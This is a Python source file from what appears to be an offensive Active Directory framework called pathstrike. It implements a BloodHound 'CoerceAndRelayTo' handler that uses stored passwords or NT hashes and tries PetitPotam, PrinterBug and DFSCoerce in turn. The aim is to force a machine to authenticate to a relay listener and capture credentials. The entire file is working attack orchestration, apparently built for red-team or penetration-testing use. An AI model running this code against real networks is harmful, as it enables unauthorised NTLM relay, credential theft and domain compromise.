"""Handler for authentication coercion and relay edge types.

Supports the ``CoerceAndRelayTo`` BloodHound edge, which represents
scenarios where an attacker can force a target machine to authenticate
and relay those credentials to a secondary target.
"""

from __future__ import annotations

import logging
from typing import Any

from pathstrike.handlers.base import BaseEdgeHandler
from pathstrike.engine.edge_registry import register_handler
from pathstrike.models import (
    Credential,
    CredentialType,
    EdgeInfo,
    RollbackAction,
)

logger = logging.getLogger("pathstrike.handlers.coercion")


@register_handler("CoerceAndRelayTo", "CoerceAndRelayNTLMToSMB")
class CoerceAndRelayHandler(BaseEdgeHandler):
    """Exploit authentication coercion to relay NTLM credentials.

    This handler orchestrates a coercion + relay attack chain:

    1. **Prerequisite**: Verify coercion tools are available and a relay
       listener can be set up.
    2. **Exploit**: Trigger authentication coercion from the source machine,
       capturing the NTLM authentication and relaying it to the target.
    3. **Credential capture**: Store any credentials obtained through the
       relay (e.g., computer account hash, RBCD delegation).

    Coercion methods attempted (in order of preference):
    - PetitPotam (MS-EFSRPC) — most reliable, works unauthenticated on unpatched DCs
    - PrinterBug (MS-RPRN) — requires Print Spooler running
    - DFSCoerce (MS-DFSNM) — alternative when above are patched

    .. note::
        No rollback is needed as coercion attacks only trigger
        authentication — they don't modify AD objects.  The relay
        target may have changes (e.g., RBCD), but those are handled
        by the subsequent edge handler in the path.
    """

    async def check_prerequisites(self, edge: EdgeInfo) -> dict[str, Any]:
        """Verify coercion tools and authentication requirements.

        Checks:
        - At least one coercion tool is available (PetitPotam.py, printerbug.py, DFSCoerce.py)
        - Valid credentials exist for the source domain
        - Source target is reachable
        """
        import shutil

        tools = {
            "PetitPotam.py": "PetitPotam (MS-EFSRPC)",
            "printerbug.py": "PrinterBug (MS-RPRN)",
            "DFSCoerce.py": "DFSCoerce (MS-DFSNM)",
        }

        available_tools = {
            name: desc for name, desc in tools.items() if shutil.which(name)
        }

        if not available_tools:
            return {
                "ready": False,
                "reason": (
                    "No coercion tools found on PATH. Install at least one of: "
                    "PetitPotam.py, printerbug.py, DFSCoerce.py"
                ),
            }

        # Check for valid credentials
        cred = self.credential_store.get_best_credential(
            edge.source.name, self._get_domain()
        )
        if not cred:
            return {
                "ready": False,
                "reason": f"No credentials available for {edge.source.name}",
            }

        return {
            "ready": True,
            "available_tools": list(available_tools.keys()),
            "credential_type": cred.cred_type.value,
        }

    async def exploit(self, edge: EdgeInfo, dry_run: bool = False) -> dict[str, Any]:
        """Execute coercion attack against the source to relay to target.

        Tries available coercion methods in order until one succeeds:
        1. PetitPotam (unauthenticated first, then authenticated)
        2. PrinterBug
        3. DFSCoerce

        Args:
            edge: The CoerceAndRelayTo edge to exploit.
            dry_run: If True, report what would be done without executing.

        Returns:
            Result dict with coercion outcome.
        """
        source_host = self._resolve_target(edge.source)
        target_host = self._resolve_target(edge.target)
        domain = self._get_domain()

        if dry_run:
            return {
                "success": True,
                "output": (
                    f"[DRY RUN] Would coerce {edge.source.name} ({source_host}) "
                    f"to authenticate and relay to {edge.target.name} ({target_host})"
                ),
                "dry_run": True,
            }

        cred = self.credential_store.get_best_credential(
            edge.source.name, domain
        )
        if not cred:
            return {
                "success": False,
                "error": f"No credentials for {edge.source.name}",
            }

        # Extract auth details
        username = cred.username
        password = cred.value if cred.cred_type == CredentialType.password else None
        nt_hash = cred.value if cred.cred_type == CredentialType.nt_hash else None

        from pathstrike.tools.coercion_wrapper import (
            run_petitpotam,
            run_printerbug,
            run_dfscoerce,
        )
        import shutil

        # Try coercion methods in order of preference
        coercion_attempts = []

        if shutil.which("PetitPotam.py"):
            self.logger.info(
                "Attempting PetitPotam coercion: %s → %s",
                source_host,
                target_host,
            )
            result = await run_petitpotam(
                listener_ip=target_host,
                target_ip=source_host,
                domain=domain,
                username=username,
                password=password,
                nt_hash=nt_hash,
            )
            coercion_attempts.append(("PetitPotam", result))
            if result["success"]:
                self.logger.info("PetitPotam coercion succeeded")
                return {
                    "success": True,
                    "output": result["output"],
                    "method": "PetitPotam",
                }

        if shutil.which("printerbug.py"):
            self.logger.info(
                "Attempting PrinterBug coercion: %s → %s",
                source_host,
                target_host,
            )
            result = await run_printerbug(
                listener_ip=target_host,
                target_ip=source_host,
                domain=domain,
                username=username,
                password=password,
                nt_hash=nt_hash,
            )
            coercion_attempts.append(("PrinterBug", result))
            if result["success"]:
                self.logger.info("PrinterBug coercion succeeded")
                return {
                    "success": True,
                    "output": result["output"],
                    "method": "PrinterBug",
                }

        if shutil.which("DFSCoerce.py"):
            self.logger.info(
                "Attempting DFSCoerce coercion: %s → %s",
                source_host,
                target_host,
            )
            result = await run_dfscoerce(
                listener_ip=target_host,
                target_ip=source_host,
                domain=domain,
                username=username,
                password=password,
                nt_hash=nt_hash,
            )
            coercion_attempts.append(("DFSCoerce", result))
            if result["success"]:
                self.logger.info("DFSCoerce coercion succeeded")
                return {
                    "success": True,
                    "output": result["output"],
                    "method": "DFSCoerce",
                }

        # All methods failed
        error_summary = "; ".join(
            f"{name}: {r.get('error', 'unknown error')}" for name, r in coercion_attempts
        )
        return {
            "success": False,
            "error": f"All coercion methods failed: {error_summary}",
            "attempts": coercion_attempts,
        }

    def get_rollback_action(self, edge: EdgeInfo) -> RollbackAction | None:
        """No rollback needed — coercion only triggers authentication.

        The coercion itself does not modify any AD objects.  Any downstream
        changes (RBCD, shadow credentials) are handled by subsequent edge
        handlers in the attack path.
        """
        return None
